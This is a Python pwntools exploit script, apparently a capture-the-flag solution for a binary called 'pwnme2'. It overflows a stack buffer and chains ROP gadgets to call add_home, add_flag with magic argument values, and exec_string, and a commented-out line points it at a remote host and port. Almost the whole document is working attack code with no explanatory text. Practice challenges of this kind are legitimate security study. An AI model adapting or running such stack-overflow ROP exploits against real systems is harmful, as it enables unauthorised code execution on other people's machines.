from pwn import *

#junk + p32(addhome) + p32(pop_ret) + arg1 + p32(addflag) + p32(pop_pop_ret) + arg2 + arg1 + p32(exec)
#ROPgadget --binary ./pwnme2 --only "pop|ret"

context(arch='i386', os='linux', log_level='debug')

def debug(addr = '0x080486f6'):
    raw_input('debug:')
    gdb.attach(r, "b *" + addr)

r = process('/home/h11p/hackme/pwnme2')
#r = remote('104.224.169.128', 18887)


elf = ELF('/home/h11p/hackme/pwnme2')
add_home_addr = elf.symbols['add_home']
add_flag_addr = elf.symbols['add_flag']
exec_str_addr = elf.symbols['exec_string']

pop_ret = 0x08048680
#pop_ret = 0x08048409
pop_pop_ret = 0x0804867f

payload = cyclic(0x6c)
payload += cyclic(0x04)
payload += p32(add_home_addr) + p32(pop_ret) + '\xef\xbe\xad\xde'#add_home

#a1 == 0xCAFEBABE && a2 == 0xABADF00D
payload += p32(add_flag_addr) + p32(pop_pop_ret)  + '\xbe\xba\xfe\xca' + '\x0d\xf0\xad\xab'#add_flag

payload += p32(exec_str_addr)
debug()
r.recvuntil('Please input:', drop=True)
r.sendline(payload)
print r.recvall()